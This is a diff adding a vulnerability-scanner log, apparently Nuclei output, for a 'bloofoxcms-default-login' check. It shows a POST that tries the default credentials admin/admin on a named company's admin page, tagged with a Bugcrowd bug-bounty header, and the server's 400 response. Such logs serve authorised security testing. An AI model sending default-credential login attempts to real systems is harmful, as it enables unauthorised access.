@@ -1,0 +1,24 @@
+[bloofoxcms-default-login] Dumped HTTP request for https://techsolutions.bitpanda.com/admin/index.php
+
+
+POST /admin/index.php HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Kubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
+Content-Length: 42
+Content-Type: application/x-www-form-urlencoded
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+username=admin&password=admin&action=login
+[bloofoxcms-default-login] Dumped HTTP response https://techsolutions.bitpanda.com/admin/index.php
+
+HTTP/1.1 400 Bad Request
+Connection: close
+Content-Length: 11
+Date: Tue, 05 Aug 2025 12:53:23 GMT
+Via: 1.1 ddba66e53ff633c34296b8e866a481e2.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: dz4zB4JRFCJchEx0NIFL1gGO41ra8XlI_6gDqFKHFlJtADF2O-1aiQ==
+X-Amz-Cf-Pop: IAD55-P8
+X-Cache: LambdaGeneratedResponse from cloudfront
+
+Bad Request
